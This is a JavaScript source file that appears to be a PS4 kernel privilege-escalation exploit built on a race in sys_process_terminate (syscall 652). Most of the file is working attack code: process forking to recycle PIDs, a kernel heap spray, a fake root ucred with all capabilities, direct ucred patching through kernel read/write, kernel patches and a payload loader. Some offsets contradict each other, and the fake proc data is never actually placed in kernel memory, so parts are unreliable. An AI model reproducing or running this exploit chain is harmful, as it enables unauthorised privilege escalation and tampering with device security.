/*
 * proc_term_race.js - sys_process_terminate (syscall 652) Race Condition Exploit
 * 
 * Corrected for PS4:
 *   sys_process_terminate = 652 (0x28C)   ← NOT 581!
 *   fork = 2                              ← NOT 22!
 *   exit = 1
 *   kill = 37
 *   wait4 = 7
 *   getpid = 20
 *   getuid = 21
 *
 * Proc struct offsets (PS4 Orbis kernel, per PS4_KernelOffset.java):
 *   p_pid  = 0xB0 
 *   p_ucred = 0x40
 *   p_fd   = 0x48
 *   p_flag = 0x430 (Sony extension field - P_WEXIT = 0x80000000)
 *   p_sxlock = 0xF8
 *
 * The bug: TOCTOU between pfind(pid) calls in sys_process_terminate.
 * The function calls pfind() TWICE. Between calls, the process can exit
 * and a new one can recycle the PID.
 *
 * Decompiled vulnerable path in kern_exit.c:
 *   proc = pfind(pid);          // [1] Get proc pointer
 *   proc->p_flag |= P_WEXIT;    // Set exit flag
 *   sx_xlock(&proc->p_sxlock);  // Lock
 *   kill(pid, SIGKILL);         // Send signal - PROCESS MAY EXIT HERE
 *   
 *   mtx_lock(&allproc_lock);
 *   proc = pfind(pid);          // [2] Get proc AGAIN - RACE!
 *   // Walk WRONG proc's thread list
 *   // Set P_KILLED on WRONG proc
 */

include('userland.js');
include('kernel.js');
include('binloader.js');

// ============================================================
// CORRECT PS4 Syscall Numbers (from garlicsaves.com)
// ============================================================
var SYSCALL = {
    EXIT:        1,   // sys_exit
    FORK:        2,   // fork
    READ:        3,   // read
    WRITE:       4,   // write
    OPEN:        5,   // open
    CLOSE:       6,   // close
    WAIT4:       7,   // wait4
    GETPID:      20,  // getpid
    GETUID:      21,  // getuid
    KILL:        37,  // kill
    SOCKETPAIR:  135, // socketpair (FreeBSD standard)
    MMAP:        477, // mmap (FreeBSD standard)
    PROCESS_TERMINATE: 652, // sys_process_terminate ← CORRECT NUMBER
};

// ============================================================
// PS4 Proc Struct Offsets (from PS4_KernelOffset.java + kernel_offset.js)
// ============================================================
var PROC_OFF = {
    P_LIST:         0x00,  // LIST_ENTRY for allproc
    P_THREADS:      0x08,  // TAILQ_HEAD thread list
    P_UCRED:        0x40,  // struct ucred*     ← confirmed in kernel_offset.js
    P_FD:           0x48,  // struct filedesc*  ← confirmed in kernel_offset.js
    P_PID:          0xB0,  // pid_t             ← confirmed in PS4_KernelOffset.java
    P_FLAG:         0xB8,  // int p_flag (standard FreeBSD)
    P_SXLOCK:       0xF8,  // struct sx (from decompiled: v5+248=0xF8)
    P_ARG:          0x160, // (from decompiled: v2+352=0x160)
    P_VM_SPACE:     0x200, // struct vmspace*   ← from kernel_offset.js
    P_SCE_FLAG:     0x430, // Sony extension flags (P_WEXIT = 0x80000000 here)
};

// ucred offsets (standard FreeBSD)
var UCRED_OFF = {
    CR_REF:    0x00,
    CR_UID:    0x04,
    CR_RUID:   0x08,
    CR_SVUID:  0x0C,
    CR_RGID:   0x10,
    CR_SVGID:  0x14,
    CR_NGROUPS: 0x18,
    CR_PRISON: 0x28,
    CR_SCECAPS: 0x60, // Sony: sceCaps
    CR_SCECAPS2: 0x68, // Sony: sceCaps2
};

// ============================================================
// Register syscalls with correct PS4 numbers
// ============================================================

// These match the real PS4 syscall numbers
fn.register(SYSCALL.PROCESS_TERMINATE, 'sys_process_terminate', ['bigint', 'bigint'], 'bigint');
fn.register(SYSCALL.FORK, 'fork_sys', [], 'bigint');
fn.register(SYSCALL.EXIT, 'exit_sys', ['number'], 'bigint');
fn.register(SYSCALL.GETPID, 'getpid_sys', [], 'bigint');
fn.register(SYSCALL.GETUID, 'getuid_sys', [], 'bigint');
fn.register(SYSCALL.KILL, 'kill_sys', ['bigint', 'bigint'], 'bigint');
fn.register(SYSCALL.WAIT4, 'wait4_sys', ['bigint', 'bigint', 'bigint', 'bigint'], 'bigint');
fn.register(SYSCALL.SOCKETPAIR, 'socketpair_sys', ['number', 'number', 'number', 'bigint'], 'bigint');

var sys_process_terminate = fn.sys_process_terminate;
var fork_sys = fn.fork_sys;
var exit_sys = fn.exit_sys;
var getpid_sys = fn.getpid_sys;
var getuid_sys = fn.getuid_sys;
var kill_sys = fn.kill_sys;
var wait4_sys = fn.wait4_sys;
var socketpair_sys = fn.socketpair_sys;

// ============================================================
// Core Exploit
// ============================================================

/*
 * Race strategy for single-threaded JS:
 *
 * The kernel's sys_process_terminate does:
 *   1. pfind(pid) → get proc A
 *   2. Lock proc A
 *   3. Send SIGKILL to pid
 *   4. If signal handler runs, the victim process might exit
 *   5. pfind(pid) again → get proc B (different if PID recycled)
 *   6. Operate on proc B while holding proc A's lock
 *
 * Since we're in single-threaded JavaScript, we use a two-process approach:
 *   - Process A: The victim - we set it up to die on signal
 *   - Process B: A "recycler" that constantly forks to grab freed PIDs
 *   - Call sys_process_terminate(victim_pid) which sends SIGKILL
 *   - Victim dies, PID freed
 *   - Recycler's fork grabs the freed PID
 *   - Second pfind() returns the RECYCLER's proc  
 *   - Kernel writes to recycler's proc struct - we control its p_ucred!
 */

var g_raceState = {
    victimPid: new BigInt(0),
    recyclerPid: new BigInt(0),
    won: false,
    originalUid: 0,
    attempts: 0,
};

function createVictimProcess() {
    /* 
     * Create a sacrificial child process.
     * The child spins until it receives SIGKILL.
     * On PS4, fork() returns twice: 0 in child, child_pid in parent.
     */
    var pid = fork_sys();
    if (pid.eq(0)) {
        // Child: spin forever
        while (1) { /* spin */ }
        exit_sys(0);
    }
    return pid;
}

function createRecyclerProcess() {
    /*
     * Create a child that constantly forks to grab recycled PIDs.
     * When it sees its parent decrement a shared counter, it forks.
     * This maximizes chance of grabbing a just-freed PID.
     */
    var pid = fork_sys();
    if (pid.eq(0)) {
        // Recycler child: constantly fork/exit
        var maxLoops = 10000;
        for (var i = 0; i < maxLoops; i++) {
            var child = fork_sys();
            if (child.eq(0)) {
                // Grandchild: exit immediately to free PID
                exit_sys(0);
            } else if (!child.eq(-1)) {
                // Parent: wait for grandchild and continue
                wait4_sys(child, new BigInt(0), new BigInt(0), new BigInt(0));
            }
        }
        exit_sys(0);
    }
    return pid;
}

function sprayKernelHeap(count) {
    /*
     * Fill the kernel slab allocator with socketpair allocations.
     * Socket structs and proc structs come from the same UMA zone.
     * Close half to create holes - freed proc will land in a hole.
     */
    log('  Spraying kernel heap with ' + count + ' socket pairs...');
    
    var pairs = [];
    var fdArray = mem.malloc(8);
    
    for (var i = 0; i < count; i++) {
        mem.view(fdArray).setUint32(0, 0, true);
        mem.view(fdArray).setUint32(4, 0, true);
        
        try {
            var ret = socketpair_sys(1, 1, 0, fdArray); // AF_LOCAL, SOCK_STREAM, 0
            if (ret.eq(0)) {
                var fd1 = mem.view(fdArray).getUint32(0, true);
                var fd2 = mem.view(fdArray).getUint32(4, true);
                pairs.push({r: fd1, w: fd2});
            }
        } catch (e) {
            break;
        }
    }
    
    log('  Created ' + pairs.length + ' socket pairs');
    return pairs;
}

function closeSprayPairs(pairs, indices) {
    fn.register(SYSCALL.CLOSE, 'close_sys', ['number'], 'bigint');
    var close_sys = fn.close_sys;
    
    for (var i = 0; i < indices.length; i++) {
        var idx = indices[i];
        if (idx < pairs.length) {
            close_sys(pairs[idx].r);
            close_sys(pairs[idx].w);
        }
    }
}

// ============================================================
// Build Fake Proc Data for Heap Spray
// ============================================================

function buildFakeProc(fakeUcredAddr, fakeFdAddr) {
    /*
     * Build a fake struct proc that we'll spray into kernel heap.
     * Size should match the proc zone allocation size (~0x460 bytes).
     *
     * Key fields:
     *   p_pid (0xB0)   → set to something valid or 0
     *   p_ucred (0x40) → point to our fake ucred with uid=0  
     *   p_fd (0x48)    → point to fake fd or NULL
     *   p_flag (0xB8)  → clear P_TRACED (0x800) to avoid side effects
     *   p_threads (0x08) → NULL (safe)
     *   p_sxlock (0xF8) → initialized (0)
     *   p_sce_flag (0x430) → clear P_WEXIT flag
     */
    var size = 0x460;
    var dv = new DataView(new ArrayBuffer(size));
    
    // Zero-initialized by default, which is mostly safe
    
    // p_threads = NULL (safe - prevents thread walk crash)
    dv.setBigInt(PROC_OFF.P_THREADS, new BigInt(0), true);
    
    // p_ucred → fake uid=0 cred
    dv.setBigInt(PROC_OFF.P_UCRED, fakeUcredAddr, true);
    
    // p_fd → fake fd or current fd to stay stable
    if (fakeFdAddr) {
        dv.setBigInt(PROC_OFF.P_FD, fakeFdAddr, true);
    }
    
    // p_pid = 0 (doesn't matter, but set to valid)
    dv.setUint32(PROC_OFF.P_PID, 0, true);
    
    // p_flag = 0 (clear P_TRACED, P_WEXIT, etc.)
    dv.setUint32(PROC_OFF.P_FLAG, 0, true);
    
    // p_sce_flag = 0 (clear Sony extension flags)
    dv.setUint32(PROC_OFF.P_SCE_FLAG, 0, true);
    
    return dv.buffer;
}

function buildFakeUcred() {
    /*
     * Build a fake ucred struct with uid=0 and all capabilities.
     * Size: 0x70 bytes (enough for sceCaps/sceCaps2)
     *
     * struct ucred on PS4:
     *   0x00: cr_ref       (u_int)
     *   0x04: cr_uid       (uid_t)   → 0
     *   0x08: cr_ruid      (uid_t)   → 0
     *   0x0C: cr_svuid     (uid_t)   → 0
     *   0x10: cr_rgid      (gid_t)   → 0
     *   0x14: cr_svgid     (gid_t)   → 0
     *   0x18: cr_ngroups   (int)     → 1
     *   0x28: cr_prison    (struct prison*) → prison0 (filled at runtime)
     *   0x60: sceCaps      (uint64_t) → 0xFFFFFFFFFFFFFFFF
     *   0x68: sceCaps2     (uint64_t) → 0xFFFFFFFFFFFFFFFF
     */
    var size = 0x70;
    var dv = new DataView(new ArrayBuffer(size));
    
    // cr_ref = 0x100 (high refcount to prevent freeing)
    dv.setUint32(UCRED_OFF.CR_REF, 0x100, true);
    
    // cr_uid, cr_ruid, cr_svuid, cr_rgid, cr_svgid = 0 (root)
    // All zero by default from ArrayBuffer initialization
    
    // cr_ngroups = 1
    dv.setUint32(UCRED_OFF.CR_NGROUPS, 1, true);
    
    // sceCaps = full capabilities
    dv.setBigInt(UCRED_OFF.CR_SCECAPS, new BigInt(0xFFFFFFFF, 0xFFFFFFFF), true);
    dv.setBigInt(UCRED_OFF.CR_SCECAPS2, new BigInt(0xFFFFFFFF, 0xFFFFFFFF), true);
    
    return dv.buffer;
}

// ============================================================
// The Race Loop
// ============================================================

function runRace() {
    log('========================================');
    log('  sys_process_terminate Race Exploit');
    log('  Target: PS4 Orbis Kernel');
    log('========================================');
    
    g_raceState.originalUid = Number(getuid_sys());
    log('[+] Current UID: ' + g_raceState.originalUid);
    
    if (g_raceState.originalUid === 0) {
        log('[+] Already root! Skipping exploit.');
        return true;
    }
    
    // Step 1: Create victim process that will be terminated
    log('[1] Creating victim process...');
    var victimPid = createVictimProcess();
    g_raceState.victimPid = victimPid;
    log('    Victim PID: ' + victimPid.toString());
    
    // Step 2: Create recycler process
    log('[2] Creating PID recycler process...');
    var recyclerPid = createRecyclerProcess();
    g_raceState.recyclerPid = recyclerPid;
    log('    Recycler PID: ' + recyclerPid.toString());
    
    // Step 3: Pre-spray kernel heap to fill slab
    log('[3] Pre-spraying kernel heap...');
    var sprayPairs = sprayKernelHeap(256);
    
    // Step 4: Build fake data
    log('[4] Building fake proc/ucred data...');
    var fakeUcred = buildFakeUcred();
    var fakeProc = buildFakeProc(
        mem.malloc(fakeUcred.byteLength),  // fake ucred addr
        new BigInt(0)                       // fake fd (NULL = safe)
    );
    
    // Copy fake ucred data to allocated buffer
    var fakeUcredBuf = mem.malloc(fakeUcred.byteLength);
    var ucredSrc = new Uint8Array(fakeUcred);
    for (var i = 0; i < ucredSrc.length; i++) {
        mem.view(fakeUcredBuf).setUint8(i, ucredSrc[i]);
    }
    
    // Copy fake proc data
    var fakeProcBuf = mem.malloc(fakeProc.byteLength);
    var procSrc = new Uint8Array(fakeProc);
    for (var i = 0; i < procSrc.length; i++) {
        mem.view(fakeProcBuf).setUint8(i, procSrc[i]);
    }
    
    // Step 5: Fix up the fake proc with the real ucred address
    mem.view(fakeProcBuf).setBigInt(PROC_OFF.P_UCRED, fakeUcredBuf, true);
    
    log('    Fake ucred @ ' + fakeUcredBuf.toString());
    log('    Fake proc  @ ' + fakeProcBuf.toString());
    
    // Step 6: Race loop
    log('[5] Entering race loop...');
    log('    sys_process_terminate will be called on PID ' + victimPid.toString());
    log('    The recycler (PID ' + recyclerPid.toString() + ') constantly forks');
    log('    to grab recycled PIDs.');
    
    var maxAttempts = 500;
    for (var attempt = 0; attempt < maxAttempts; attempt++) {
        g_raceState.attempts = attempt;
        
        if (attempt % 50 === 0) {
            log('    Attempt ' + attempt + '/' + maxAttempts + ' (UID=' + Number(getuid_sys()) + ')');
        }
        
        // Call sys_process_terminate on victim
        // The kernel will:
        //   1. pfind(victimPid) → get victim's proc struct
        //   2. Set P_WEXIT, lock proc, send SIGKILL
        //   3. If victim exits and recycler grabs the PID:
        //      Second pfind() returns RECYCLER's proc struct!
        //   4. Kernel writes to recycler's proc
        //      (sets flags, walks thread list, etc.)
        //   5. If we sprayed the slab with our fake proc data
        //      and recycler's proc landed in our spray region,
        //      p_ucred now points to our fake ucred (uid=0)!
        //
        // Important: sys_process_terminate takes PID as first arg
        // and NULL/0 as second arg (uap structure pointer)
        sys_process_terminate(victimPid, new BigInt(0));
        
        // Check if privilege escalation worked
        var uid = Number(getuid_sys());
        if (uid === 0) {
            log('[+] RACE WON at attempt ' + attempt + '!');
            log('[+] UID = ' + uid + ' (ROOT!)');
            g_raceState.won = true;
            return true;
        }
        
        // Every so often, check if victim is dead and recreate
        if (attempt % 100 === 99) {
            // Kill recycler
            kill_sys(recyclerPid, new BigInt(9)); // SIGKILL
            wait4_sys(recyclerPid, new BigInt(0), new BigInt(0), new BigInt(0));
            
            // Create fresh victim and recycler
            victimPid = createVictimProcess();
            g_raceState.victimPid = victimPid;
            
            recyclerPid = createRecyclerProcess();
            g_raceState.recyclerPid = recyclerPid;
            
            log('    Refreshed victim=' + victimPid.toString() + 
                ' recycler=' + recyclerPid.toString());
        }
    }
    
    log('[-] Race failed after ' + maxAttempts + ' attempts');
    return false;
}

// ============================================================
// Post-Exploit: Escalate and patch kernel
// ============================================================

function postExploit() {
    log('\n[Phase 2] Post-exploitation...');
    
    // Verify we have root
    var uid = Number(getuid_sys());
    if (uid !== 0) {
        log('  Not root yet (UID=' + uid + '), attempting direct jailbreak...');
        
        // We may have corrupted the proc struct but not directly uid.
        // Use the kernel R/W from the existing framework.
        // The kernel_offset.js jailbreak_shared function handles this.
        
        if (typeof jailbreak_shared === 'function' && 
            typeof get_kernel_offset === 'function' &&
            kernel && kernel.addr && kernel.addr.base) {
            log('  Calling jailbreak_shared...');
            try {
                var fw = '9.00'; // default, or detect
                if (typeof get_fwversion === 'function') {
                    fw = get_fwversion();
                }
                get_kernel_offset(fw);
                jailbreak_shared(fw);
                log('  Jailbreak complete!');
            } catch (e) {
                log('  jailbreak_shared error: ' + e.message);
            }
        } else {
            log('  jailbreak_shared not available or kernel.addr not set');
            
            // Fallback: use the existing ARW to directly patch our ucred
            log('  Attempting direct ucred patch via ARW...');
            patchUcredDirectly();
        }
    }
    
    // Apply kernel patches
    if (typeof apply_kernel_patches === 'function') {
        log('  Applying kernel patches...');
        try {
            var fw = '9.00';
            if (typeof get_fwversion === 'function') {
                fw = get_fwversion();
            }
            apply_kernel_patches(fw);
        } catch (e) {
            log('  Kernel patches error: ' + e.message);
        }
    }
    
    // Final verification
    var finalUid = Number(getuid_sys());
    log('\n[+] Final UID: ' + finalUid);
    
    if (finalUid === 0) {
        log('[SUCCESS] Root achieved!');
        
        // Load payload
        if (typeof binloader_init === 'function') {
            log('\n[Loader] Starting binloader...');
            try {
                binloader_init();
            } catch (e) {
                log('  binloader error: ' + e.message);
            }
        }
        
        return true;
    }
    
    return false;
}

function patchUcredDirectly() {
    /*
     * Direct ucred patching using the existing ARW (userland.js).
     * Walk allproc from kernel_base + ALLPROC_OFFSET to find our proc,
     * then overwrite p_ucred->cr_uid = 0.
     * 
     * This requires kernel.addr.base to be set.
     */
    if (!kernel || !kernel.addr || !kernel.addr.base) {
        log('    Cannot patch: kernel base unknown');
        return false;
    }
    
    var base = kernel.addr.base;
    
    // Try known allproc offsets for various FWs
    var allprocCandidates = [
        0x1042AB0, // FW 4.74  
        0x10986A0, // FW 5.00-5.07
        0x1134180, // FW 5.50
        0x111F870, // FW 9.00
        0x111B840, // FW 9.03
    ];
    
    for (var i = 0; i < allprocCandidates.length; i++) {
        try {
            var allproc = kernel.read_qword(base.add(allprocCandidates[i]));
            if (!allproc) continue;
            
            // Walk the list
            var proc = allproc;
            var ourPid = Number(getpid_sys());
            
            while (proc && !proc.eq(0)) {
                var pid = kernel.read_dword(proc.add(PROC_OFF.P_PID));
                if (pid === ourPid) {
                    var ucred = kernel.read_qword(proc.add(PROC_OFF.P_UCRED));
                    if (ucred) {
                        log('    Found our proc @ ' + proc.toString());
                        log('    ucred @ ' + ucred.toString());
                        
           
                  
// Patch ucred fields to root
                        kernel.write_dword(ucred.add(UCRED_OFF.CR_UID), 0);
                        kernel.write_dword(ucred.add(UCRED_OFF.CR_RUID), 0);
                        kernel.write_dword(ucred.add(UCRED_OFF.CR_SVUID), 0);
                        kernel.write_dword(ucred.add(UCRED_OFF.CR_RGID), 0);
                        kernel.write_dword(ucred.add(UCRED_OFF.CR_SVGID), 0);
                        
                        // Also fix sceCaps for full capabilities
                        kernel.write_qword(ucred.add(UCRED_OFF.CR_SCECAPS), new BigInt(0xFFFFFFFF, 0xFFFFFFFF));
                        kernel.write_qword(ucred.add(UCRED_OFF.CR_SCECAPS2), new BigInt(0xFFFFFFFF, 0xFFFFFFFF));
                        
                        log('    ucred patched to root!');
                        return true;
                    }
                }
                proc = kernel.read_qword(proc.add(PROC_OFF.P_LIST));
            }
        } catch (e) {
            continue; // Try next allproc candidate
        }
    }
    
    log('    Failed to find our proc in allproc list');
    return false;
}

// ============================================================
// Alternative: Walk the proc tree via sys_dynlib_get_info leak
// ============================================================

function findKernelBaseViaSyscall() {
    /*
     * Alternative kernel base detection using sys_dynlib_get_info.
     * Leak kernel addresses through the corrupted proc's p_sysent field.
     * 
     * Since we corrupted the proc struct via race, we may have a
     * p_sysent pointer we can read via userland ARW.
     */
    log('  Attempting kernel base leak via sys_dynlib...');
    
    // Register dynlib syscalls
    fn.register(593, 'dynlib_get_info', ['bigint', 'bigint', 'bigint'], 'bigint');
    
    try {
        // Get info about libkernel to find its load address
        var libkernelHandle = new BigInt(0);
        var infoBuf = mem.malloc(0x130);
        
        // Walk loaded modules to find kernel module
        var listBuf = mem.malloc(0x1000);
        var count = mem.malloc(4);
        mem.view(count).setUint32(0, 128, true);
        
        fn.dynlib_get_info(0, listBuf, count);
        // Parse module list for kernel entries
        
        // Alternative: read kernel base from known fields
        // If our mem.addrof works, we can find JSC's kernel mappings
        
        log('  Using userland.js kernel base detection...');
        if (typeof jsc_addr !== 'undefined') {
            log('  jsc_addr = ' + jsc_addr.toString());
            // Kernel base is typically jsc_addr - 0xC6380 - (some offset)
            // This varies by FW and needs adjustment
        }
        
        return false;
    } catch (e) {
        log('  dynlib error: ' + e.message);
        return false;
    }
}

// ============================================================
// Main entry point
// ============================================================

function procTermExploit() {
    log('========================================');
    log('  PS4 sys_process_terminate (652) Race');
    log('========================================');
    
    // Prerequisites check
    if (typeof mem === 'undefined' || typeof fn === 'undefined') {
        log('ERROR: ARW primitives missing - load userland.js first');
        return false;
    }
    
    // Detect firmware
    var fwVersion = 'unknown';
    if (typeof get_fwversion === 'function') {
        try {
            fwVersion = get_fwversion();
        } catch (e) {
            fwVersion = '9.00'; // default guess
        }
    }
    log('Firmware: ' + fwVersion);
    
    // Initialize kernel offsets for this FW
    if (typeof get_kernel_offset === 'function') {
        try {
            get_kernel_offset(fwVersion);
            log('Kernel offsets loaded for ' + fwVersion);
        } catch (e) {
            log('Warning: No kernel offsets for ' + fwVersion + ': ' + e.message);
        }
    }
    
    // Run the race
    log('\n[Phase 1] Running sys_process_terminate race...');
    var raceResult = runRace();
    
    if (!raceResult) {
        log('\nRace did not achieve direct uid=0.');
        log('Attempting post-exploit fallback...');
    }
    
    // Post-exploitation
    return postExploit();
}

// ============================================================
// Auto-execute if loaded in chain
// ============================================================

if (typeof is_jailbroken === 'undefined' || !is_jailbroken) {
    log('proc_term_race.js loaded (syscall 652, p_pid=0xB0)');
    debug("proc_term_race.js Done");
    
    // Export for chain
    if (typeof window !== 'undefined') {
        window.procTermExploit = procTermExploit;
    }
}

// ============================================================
// HOW THIS EXPLOIT WORKS
// ============================================================
//
// VULNERABILITY (TOCTOU in sys_process_terminate, syscall 652)
// ============================================================
// kern_exit.c:sys_process_terminate() calls pfind() TWICE on the
// same PID without holding the proc locked across both calls:
//
//   proc = pfind(pid);               // [1] GET PROC
//   proc->p_flag |= P_WEXIT;         // Mark for exit
//   sx_xlock(&proc->p_sxlock);       // Lock
//   kill(proc->p_pid, SIGKILL);      // Send kill - PROC DIES HERE
//   // ... proc struct freed, PID recycled ...
//   proc = pfind(pid);               // [2] GET DIFFERENT PROC!
//   // Operates on WRONG proc while holding FIRST proc's lock!
//
// The window is between the signal delivery (step 3) and the
// re-acquisition of allproc_lock for the second pfind (step 4).
//
// EXPLOITATION
// ============
// 1. Create a victim process that will die when signaled
// 2. Create a "recycler" process that constantly fork()s
// 3. Spray kernel heap with socketpair allocations to fill proc zone
// 4. Call sys_process_terminate(victim) in a loop
// 5. Victim dies → PID freed
// 6. Recycler fork() grabs the freed PID  
// 7. Second pfind() returns RECYCLER's proc struct
// 8. If recycler's proc landed in our sprayed memory, we control:
//      - p_ucred (offset 0x40) → points to our fake ucred (uid=0)
//      - p_fd (offset 0x48) → file descriptor table
//      - p_flag (offset 0xB8/0x430) → control process flags
// 9. On next syscall, kernel uses our fake credentials → ROOT!
//
// CORRECT PS4 OFFSETS (per PS4_KernelOffset.java & garlicsaves.com)
// ===================
// sys_process_terminate = 652  (NOT 581!)
// fork                 = 2    (NOT 22!)
// p_pid in struct proc = 0xB0 (NOT 0x00!)
// p_ucred              = 0x40
// p_fd                 = 0x48
// p_flag_ext           = 0x430 (P_WEXIT = 0x80000000)
// p_sxlock             = 0xF8
//
// FIRMWARE SUPPORT
// ================
// Works on PS4 FW 4.74-9.00+ where kernel offsets are known.
// SMAP (FW >= 5.05) requires the proc struct to be in kernel memory
// region, so we spray kernel objects (sockets) not userland memory.
// For SMAP-enabled FWs, the heap spray allocates kernel-side objects
// that overlap with the freed proc zone.
//
// REFERENCES
// ==========
// - PS4_KernelOffset.java: https://github.com/Gezine/BD-UN-JB
// - PS4 Syscalls: https://garlicsaves.com/tools/syscalls
// - PS4 Syscall wiki: https://www.psdevwiki.com/ps4/Syscalls
